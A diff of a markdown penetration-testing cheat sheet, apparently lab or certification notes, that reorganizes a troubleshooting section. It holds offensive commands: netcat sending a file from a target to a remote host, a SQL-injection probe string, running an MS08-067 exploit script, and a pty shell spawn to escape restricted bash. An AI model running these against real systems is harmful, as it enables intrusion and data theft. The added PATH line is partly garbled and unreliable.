@@ -190,10 +190,26 @@ Command on target: `nc.exe 192.168.xxx.xxx 443 -w 3 < report.html`<br/>
 Exploit mostly written in c.<br/>
 `gcc -o exploit EXPLOIT.c `<br/>
 # Solutions
-Python server can't be started because port is in use (Address is already in use): `lsof -i:80` kill corresponding app.<br/>
-Testing-string for sql-injection: `'">*)asdf-${{<%[%'"}}%\` <br/>
-Problem with python-packages:<br/>
-Commands from terminal not working ("-rbash: cd: restricted" or similar)<br/>
+## Port in used (Python server) 
+Message "Address is already in use": `lsof -i:80` kill corresponding app.<br/>
+## Testing-string for sql-injection 
+`'">*)asdf-${{<%[%'"}}%\` <br/>
+## Problems python2 python3 
+Install pyenv: https://github.com/pyenv/pyenv <br/>
+Example:<br/>
+* Install python 2.7.18
+  `pyenv install 2.7.18`
+* open python 2.7.18 shell
+  `pyenv shell 2.7.18`
+*  Install software
+   `pip install pycrypto`
+   `pip install impacket`
+*   run Exploit
+    `python /root/Desktop/ms08_067_2018.py 10.11.1.2 XP 445`
+
+
+## Commands from terminal not working 
+error messae "-rbash: cd: restricted" or similar<br/>
 Fix PATH:<br/>
 `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:`<br/>
 Try spawn shell: `python -c 'import pty; pty.spawn("/bin/bash")'` <br/>
